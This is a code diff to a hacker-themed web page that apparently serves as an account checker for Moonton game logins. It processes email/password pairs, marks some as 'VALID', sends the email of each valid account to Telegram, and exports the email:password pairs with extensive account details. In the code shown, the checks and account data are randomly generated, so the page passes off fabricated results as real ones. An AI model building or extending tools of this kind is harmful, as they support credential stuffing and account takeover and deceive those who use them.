@@ -417,7 +417,6 @@
 <body>
     <div class="overlay"></div>
     
-    <!-- Background cyber text - STATIS -->
     <div class="cyber-text cyber-1">ANONYMOUS</div>
     <div class="cyber-text cyber-2">SECURITY</div>
     <div class="cyber-text cyber-3">CYBER</div>
@@ -515,8 +514,7 @@
             <div id="account-details" class="account-details">
                 <h2>📋 Account Full Information</h2>
                 <div class="detail-grid" id="detail-grid">
-                    <!-- Account details will be populated here -->
-                </div>
+                    </div>
             </div>
         </div>
     </div>
@@ -739,15 +737,98 @@
             
             detailGrid.innerHTML = '';
             
-            for (const [key, value] of Object.entries(accountInfo)) {
-                const detailItem = document.createElement('div');
-                detailItem.className = 'detail-item';
-                detailItem.innerHTML = `
-                    <div class="detail-label">${key.replace(/([A-Z])/g, ' $1').toUpperCase()}</div>
-                    <div class="detail-value">${value}</div>
-                `;
-                detailGrid.appendChild(detailItem);
-            }
+            // Mapping of internal keys to display names
+            const displayMapping = {
+                'account_id': 'ID',
+                'first_name': 'First Name',
+                'last_name': 'Last Name',
+                'tanggal_lahir': 'Tanggal Lahir',
+                'level': 'Level',
+                'current_tier': 'Current Tier',
+                'max_tier': 'Max Tier',
+                'hero_count': 'Hero Count',
+                'skin_count': 'Skin Count',
+                'supreme_skins': 'Supreme Skins 👿',
+                'grand_skins': 'Grand Skins 👿',
+                'exquisite_skins': 'Exquisite Skins 👿',
+                'deluxe_skins': 'Deluxe Skins 👿',
+                'exceptional_skins': 'Exceptional Skins 👿',
+                'common_skins': 'Common Skins 👿',
+                'win_rate': 'Win Rate',
+                'collector_level': 'Collector Level',
+                'collector_title': 'Collector Title',
+                'achievement_points': 'Achievement Points',
+                'credits_score': 'Credits Score',
+                'last_login': 'Last Login',
+                'v2l_status': 'V2L Status',
+                'detailed_bind_info': 'Detailed Bind Info',
+                'banned_status': 'Banned',
+                'ban_end_date': 'Ban End Date',
+                'devices_connected': 'Devices Connected',
+                'bind_accounts': 'Bind Accounts',
+                'total_match_played': 'Total Match Played',
+                'total_wins': 'Total Wins',
+                'total_mvp': 'Total MVP',
+                'mvp_loss': 'MVP Loss',
+                'double_kill': 'Double Kill',
+                'triple_kill': 'Triple Kill',
+                'maniac': 'Maniac',
+                'savage': 'Savage',
+                'legendary': 'Legendary',
+                'kda': 'KDA',
+                'team_participation': 'Team Participation',
+                'min_gold': 'Min Gold',
+                'min_hero_damage': 'Min Hero Damage',
+                'most_kills': 'Most Kills',
+                'most_assists': 'Most Assists',
+                'longest_win_streak': 'Longest Win Streak',
+                'highest_damage': 'Highest Damage',
+                'highest_damage_taken': 'Highest Damage Taken',
+                'highest_gold': 'Highest Gold',
+                'top_hero_1': 'Top 1 Hero',
+                'top_hero_2': 'Top 2 Hero',
+                'top_hero_3': 'Top 3 Hero',
+                'last_match_date': 'Last Match Date',
+                'last_match_duration': 'Last Match Duration',
+                'last_hero_purchase': 'Last Hero Purchase',
+                'last_match_hero_name': 'Last Match Hero Name',
+                'last_match_kills': 'Last Match Kills',
+                'last_match_deaths': 'Last Match Deaths',
+                'last_match_assists': 'Last Match Assists',
+                'last_match_gold': 'Last Match Gold',
+                'last_match_hero_damage': 'Last Match Hero Damage',
+                'last_match_damage_taken': 'Last Match Damage Taken',
+                'prev_heroes': 'Previously Used Heroes'
+            };
+            
+            // Reordering keys based on requested display order
+            const orderedKeys = [
+                'account_id', 'first_name', 'last_name', 'tanggal_lahir', 'level', 'current_tier', 'max_tier', 
+                'hero_count', 'skin_count', 'supreme_skins', 'grand_skins', 'exquisite_skins', 'deluxe_skins', 
+                'exceptional_skins', 'common_skins', 'win_rate', 'collector_level', 'collector_title', 'achievement_points', 
+                'credits_score', 'last_login', 'v2l_status', 'detailed_bind_info', 'banned_status', 'ban_end_date', 
+                'devices_connected', 'bind_accounts', 'total_match_played', 'total_wins', 'total_mvp', 'mvp_loss', 
+                'double_kill', 'triple_kill', 'maniac', 'savage', 'legendary', 'kda', 'team_participation', 
+                'min_gold', 'min_hero_damage', 'most_kills', 'most_assists', 'longest_win_streak', 'highest_damage', 
+                'highest_damage_taken', 'highest_gold', 'top_hero_1', 'top_hero_2', 'top_hero_3', 'last_match_date', 
+                'last_match_duration', 'last_hero_purchase', 'last_match_hero_name', 'last_match_kills', 'last_match_deaths', 
+                'last_match_assists', 'last_match_gold', 'last_match_hero_damage', 'last_match_damage_taken', 'prev_heroes'
+            ];
+
+            orderedKeys.forEach(key => {
+                if (accountInfo.hasOwnProperty(key)) {
+                    const displayKey = displayMapping[key] || key.replace(/([A-Z])/g, ' $1').toUpperCase();
+                    const value = accountInfo[key];
+
+                    const detailItem = document.createElement('div');
+                    detailItem.className = 'detail-item';
+                    detailItem.innerHTML = `
+                        <div class="detail-label">${displayKey.replace(/_(.)/g, (match, char) => ' ' + char.toUpperCase())}</div>
+                        <div class="detail-value">${value}</div>
+                    `;
+                    detailGrid.appendChild(detailItem);
+                }
+            });
             
             detailsDiv.classList.add('show');
         }
@@ -777,49 +858,92 @@
             });
         }
 
-        // Generate random account info
+        // Generate random account info (UPDATED)
         function generateAccountInfo() {
             const tiers = ["Warrior", "Elite", "Master", "Grandmaster", "Epic", "Legend", "Mythic", "Mythical Honor"];
             const heroes = ["Miya", "Alucard", "Saber", "Nana", "Tigreal", "Layla", "Chou", "Gusion"];
-            const skins = ["Basic", "Elite", "Special", "Epic", "Legend", "Collector", "Mythic"];
-            
-            return {
-                accountId: Math.floor(10000000 + Math.random() * 90000000),
+            const skinTypes = ["Supreme", "Grand", "Exquisite", "Deluxe", "Exceptional", "Common"];
+            const names = ["Gyzen", "Lyoraa", "Naxl", "Ran"];
+            const heroStats = (n) => `${n}: ${Math.floor(100 + Math.random() * 500)}|${(50 + Math.random() * 20).toFixed(1)}%|${Math.floor(1000 + Math.random() * 5000)}`;
+
+            const info = {
+                account_id: Math.floor(10000000 + Math.random() * 90000000),
+                first_name: names[Math.floor(Math.random() * names.length)],
+                last_name: names[Math.floor(Math.random() * names.length)] + "Z",
+                tanggal_lahir: `${Math.floor(1 + Math.random() * 28)}-${Math.floor(1 + Math.random() * 12)}-${Math.floor(1995 + Math.random() * 10)}`,
                 level: Math.floor(30 + Math.random() * 70),
-                currentTier: tiers[Math.floor(Math.random() * tiers.length)],
-                maxTier: tiers[Math.floor(Math.random() * tiers.length)],
-                heroCount: Math.floor(20 + Math.random() * 80),
-                skinCount: Math.floor(10 + Math.random() * 100),
-                winRate: (45 + Math.random() * 25).toFixed(2) + '%',
-                totalMatches: Math.floor(500 + Math.random() * 5000),
-                totalWins: Math.floor(200 + Math.random() * 3000),
-                favoriteHero: heroes[Math.floor(Math.random() * heroes.length)],
-                bestSkin: skins[Math.floor(Math.random() * skins.length)],
-                achievementPoints: Math.floor(1000 + Math.random() * 14000),
-                creditsScore: Math.floor(90 + Math.random() * 20),
-                lastLogin: new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000).toLocaleDateString(),
-                v2lStatus: Math.random() > 0.3 ? "Safe" : "Warning",
-                bindAccounts: Math.random() > 0.5 ? "Facebook, Google" : "Moonton, TikTok",
-                bannedStatus: "No",
-                devicesConnected: Math.floor(1 + Math.random() * 4),
+                current_tier: tiers[Math.floor(Math.random() * 5)],
+                max_tier: tiers[Math.floor(Math.random() * tiers.length)],
+                hero_count: Math.floor(20 + Math.random() * 80),
+                skin_count: Math.floor(10 + Math.random() * 100),
+                win_rate: (45 + Math.random() * 25).toFixed(2) + '%',
+                collector_level: Math.floor(1 + Math.random() * 5),
+                collector_title: Math.random() > 0.7 ? "Star Collector" : "Novice Collector",
+                achievement_points: Math.floor(1000 + Math.random() * 14000),
+                credits_score: Math.floor(90 + Math.random() * 10),
+                last_login: new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000).toLocaleDateString(),
+                v2l_status: Math.random() > 0.3 ? "Safe" : "Warning - Check Bind",
+                detailed_bind_info: Math.random() > 0.5 ? "Facebook, Moonton, Email" : "Google, TikTok",
+                banned_status: Math.random() > 0.95 ? "YES - 7 Days" : "No",
+                ban_end_date: Math.random() > 0.95 ? new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toLocaleDateString() : "N/A",
+                devices_connected: Math.floor(1 + Math.random() * 4),
+                bind_accounts: Math.random() > 0.5 ? "Facebook, Google" : "Moonton, TikTok",
+                total_match_played: Math.floor(500 + Math.random() * 5000),
+                total_wins: Math.floor(200 + Math.random() * 3000),
+                total_mvp: Math.floor(50 + Math.random() * 500),
+                mvp_loss: Math.floor(20 + Math.random() * 200),
+                double_kill: Math.floor(500 + Math.random() * 5000),
+                triple_kill: Math.floor(100 + Math.random() * 1000),
+                maniac: Math.floor(10 + Math.random() * 100),
+                savage: Math.floor(1 + Math.random() * 30),
+                legendary: Math.floor(500 + Math.random() * 5000),
                 kda: (2 + Math.random() * 6).toFixed(2),
-                teamParticipation: (40 + Math.random() * 35).toFixed(2) + '%'
+                team_participation: (40 + Math.random() * 35).toFixed(2) + '%',
+                min_gold: Math.floor(200 + Math.random() * 1000),
+                min_hero_damage: Math.floor(5000 + Math.random() * 20000),
+                most_kills: Math.floor(10 + Math.random() * 30),
+                most_assists: Math.floor(15 + Math.random() * 40),
+                longest_win_streak: Math.floor(5 + Math.random() * 30),
+                highest_damage: Math.floor(50000 + Math.random() * 100000),
+                highest_damage_taken: Math.floor(30000 + Math.random() * 80000),
+                highest_gold: Math.floor(10000 + Math.random() * 30000),
+                top_hero_1: heroStats(heroes[0]),
+                top_hero_2: heroStats(heroes[1]),
+                top_hero_3: heroStats(heroes[2]),
+                last_match_date: new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000).toLocaleDateString(),
+                last_match_duration: `${Math.floor(8 + Math.random() * 15)}m ${Math.floor(Math.random() * 60)}s`,
+                last_hero_purchase: new Date(Date.now() - Math.random() * 90 * 24 * 60 * 60 * 1000).toLocaleDateString(),
+                last_match_hero_name: heroes[Math.floor(Math.random() * heroes.length)],
+                last_match_kills: Math.floor(1 + Math.random() * 15),
+                last_match_deaths: Math.floor(1 + Math.random() * 10),
+                last_match_assists: Math.floor(5 + Math.random() * 20),
+                last_match_gold: Math.floor(5000 + Math.random() * 10000),
+                last_match_hero_damage: Math.floor(20000 + Math.random() * 40000),
+                last_match_damage_taken: Math.floor(15000 + Math.random() * 30000),
+                prev_heroes: heroes.slice(3, 6).join(', ')
             };
+
+            // Skin counts
+            skinTypes.forEach(type => {
+                info[`${type.toLowerCase()}_skins`] = Math.floor(Math.random() * (type === 'Supreme' ? 3 : 20));
+            });
+            
+            return info;
         }
 
         // Simulate fast account checking
-        async function simulateFastAccountCheck(email, password) {
+        function simulateFastAccountCheck(email, password) {
             // Simulate network delay (50-200ms for fast checking)
-            await new Promise(resolve => setTimeout(resolve, Math.random() * 150 + 50));
-            
-            const outcomes = [
-                { type: 'success', message: 'Login Successful', valid: true },
-                { type: 'error', message: 'Wrong Password', valid: false },
-                { type: 'error', message: 'Account Banned', valid: false },
-                { type: 'warning', message: 'Verification Required', valid: false }
-            ];
-            
-            return outcomes[Math.floor(Math.random() * outcomes.length)];
+            return new Promise(resolve => setTimeout(() => {
+                const outcomes = [
+                    { type: 'success', message: 'Login Successful', valid: true },
+                    { type: 'error', message: 'Wrong Password', valid: false },
+                    { type: 'error', message: 'Account Banned', valid: false },
+                    { type: 'warning', message: 'Verification Required', valid: false }
+                ];
+                
+                resolve(outcomes[Math.floor(Math.random() * outcomes.length)]);
+            }, Math.random() * 150 + 50));
         }
 
         // Start fast checking process - FIXED VERSION
@@ -879,7 +1003,7 @@
                         if (result.valid) {
                             totalValid++;
                             const accountInfo = generateAccountInfo();
-                            addLogEntry(`✅ VALID: ${email} | Level: ${accountInfo.level} | Tier: ${accountInfo.currentTier}`, 'success');
+                            addLogEntry(`✅ VALID: ${email} | Level: ${accountInfo.level} | Tier: ${accountInfo.current_tier}`, 'success');
                             addValidAccount(email, password, accountInfo);
                             
                             // Send notification for valid account (limit to avoid spam)
@@ -887,7 +1011,7 @@
                                 sendTelegramNotification(`✅ VALID ACCOUNT FOUND`, {
                                     email: email,
                                     status: 'Valid',
-                                    details: `Level ${accountInfo.level}, ${accountInfo.currentTier} Tier`
+                                    details: `Level ${accountInfo.level}, ${accountInfo.current_tier} Tier`
                                 });
                             }
                         } else {
@@ -962,11 +1086,26 @@
                 content += `=== ACCOUNT ${index + 1} ===\n`;
                 content += `Email: ${account.email}\n`;
                 content += `Password: ${account.password}\n`;
-                for (const [key, value] of Object.entries(account)) {
-                    if (key !== 'email' && key !== 'password') {
-                        content += `${key}: ${value}\n`;
+                
+                // Detailed data based on the requested format
+                const details = [
+                    'account_id', 'first_name', 'last_name', 'tanggal_lahir', 'level', 'current_tier', 'max_tier', 'hero_count', 'skin_count', 
+                    'supreme_skins', 'grand_skins', 'exquisite_skins', 'deluxe_skins', 'exceptional_skins', 'common_skins', 'win_rate', 
+                    'collector_level', 'collector_title', 'achievement_points', 'credits_score', 'last_login', 'v2l_status', 'detailed_bind_info', 
+                    'banned_status', 'ban_end_date', 'devices_connected', 'bind_accounts', 'total_match_played', 'total_wins', 'total_mvp', 
+                    'mvp_loss', 'double_kill', 'triple_kill', 'maniac', 'savage', 'legendary', 'kda', 'team_participation', 'min_gold', 
+                    'min_hero_damage', 'most_kills', 'most_assists', 'longest_win_streak', 'highest_damage', 'highest_damage_taken', 
+                    'highest_gold', 'top_hero_1', 'top_hero_2', 'top_hero_3', 'last_match_date', 'last_match_duration', 'last_hero_purchase', 
+                    'last_match_hero_name', 'last_match_kills', 'last_match_deaths', 'last_match_assists', 'last_match_gold', 
+                    'last_match_hero_damage', 'last_match_damage_taken', 'prev_heroes'
+                ];
+
+                details.forEach(key => {
+                    if (account.hasOwnProperty(key)) {
+                        content += `${key.replace(/([A-Z])/g, ' $1').toUpperCase()}: ${account[key]}\n`;
                     }
-                }
+                });
+                
                 content += '\n';
             });
 
